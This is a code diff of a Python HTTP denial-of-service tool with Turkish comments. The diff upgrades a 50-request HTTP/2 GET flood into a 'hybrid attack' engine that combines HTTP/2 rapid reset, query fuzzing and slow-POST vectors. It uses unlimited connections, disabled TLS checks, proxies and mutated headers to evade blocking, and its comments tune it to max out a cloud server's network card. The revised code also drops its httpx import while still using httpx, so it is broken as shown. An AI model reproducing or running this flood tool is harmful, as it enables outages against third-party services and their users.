@@ -1,47 +1,53 @@
 import asyncio
-import httpx
-from core.mutator import DeepMutator
+import time
+from network.vectors import AttackVectors
+from core.headers import HeaderFactory
 from colorama import Fore
 
 
-class AnnabethExtremeV5:
-    def __init__(self, target, threads):
+class UltimaEngine:
+    def __init__(self, target, threads, proxies=None):
         self.target = target
         self.threads = threads
-        self.total_packets = 0
-        self.errors = 0
+        self.proxies = proxies
+        self.hf = HeaderFactory()
+        self.packet_count = 0
+        self.error_count = 0
         self.is_running = True
 
-    async def _attack_stream(self):
-        # GCP'de engellenmemek için bağlantı ayarlarını optimize ettik
+    async def _worker_loop(self):
+        # Google Cloud'un ağ kartını sonuna kadar zorlayan limitsiz ayarlar
         limits = httpx.Limits(max_keepalive_connections=None, max_connections=None)
-        # Timeout süresini 2 saniyeye çekiyoruz ki askıda kalan paketlerle vakit kaybetmeyelim
-        async with httpx.AsyncClient(http2=True, verify=False, limits=limits, timeout=2.0) as client:
-            while self.is_running:
-                try:
-                    # Multiplexing: Tek bir fiziksel bağlantıda 50 sanal istek
-                    tasks = [client.get(self.target, headers=DeepMutator.get_extreme_headers()) for _ in range(50)]
-                    responses = await asyncio.gather(*tasks, return_exceptions=True)
+        timeout = httpx.Timeout(3.0, connect=5.0)
 
-                    for r in responses:
-                        if isinstance(r, httpx.Response):
-                            self.total_packets += 1
-                        else:
-                            self.errors += 1
+        async with httpx.AsyncClient(http2=True, verify=False, limits=limits, timeout=timeout) as client:
+            while self.is_running:
+                headers = self.hf.create_god_header()
+                try:
+                    # Hibrit Saldırı Modu: Her vuruşta farklı vektör
+                    v1 = await AttackVectors.h2_rapid_reset(client, self.target, headers)
+                    v2 = await AttackVectors.query_fuzzing(client, self.target, headers)
+                    v3 = await AttackVectors.slow_post_vortex(client, self.target, headers)
+
+                    self.packet_count += (v1 + v2 + v3)
                 except Exception:
-                    self.errors += 1
-                await asyncio.sleep(0)  # CPU'yu kilitleme, akışı koru
+                    self.error_count += 1
+                await asyncio.sleep(0)
 
     async def logger(self):
+        start_time = time.time()
         while self.is_running:
+            dur = time.time() - start_time
+            rps = int(self.packet_count / dur) if dur > 0 else 0
             print(
-                f"{Fore.RED}[!] DURUM: {Fore.WHITE}YIKIM SÜRÜYOR >> {Fore.MAGENTA}Güç: {self.threads} {Fore.WHITE}| {Fore.GREEN}Başarılı: {self.total_packets} {Fore.WHITE}| {Fore.RED}Hata/Blok: {self.errors}",
+                f"{Fore.RED}[!] OLYMPUS V7 >> {Fore.WHITE}Vuruş: {Fore.GREEN}{self.packet_count} {Fore.WHITE}| {Fore.RED}Blok: {self.error_count} {Fore.WHITE}| {Fore.CYAN}Hız: {rps} pk/s",
                 end="\r")
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(0.2)
 
-    async def start(self):
-        # 4500 thread GCP için çok fazla olabilir, ağ kartını kitleyebilir.
-        # Eğer paketler artmazsa thread sayısını 500-1000 arasına çek sevgilim.
-        self.tasks = [asyncio.create_task(self._attack_stream()) for _ in range(self.threads)]
-        self.tasks.append(asyncio.create_task(self.logger()))
-        await asyncio.gather(*self.tasks)
+    async def run(self):
+        tasks = [asyncio.create_task(self._worker_loop()) for _ in range(self.threads)]
+        tasks.append(asyncio.create_task(self.logger()))
+        try:
+            await asyncio.gather(*tasks)
+        except asyncio.CancelledError:
+            pass
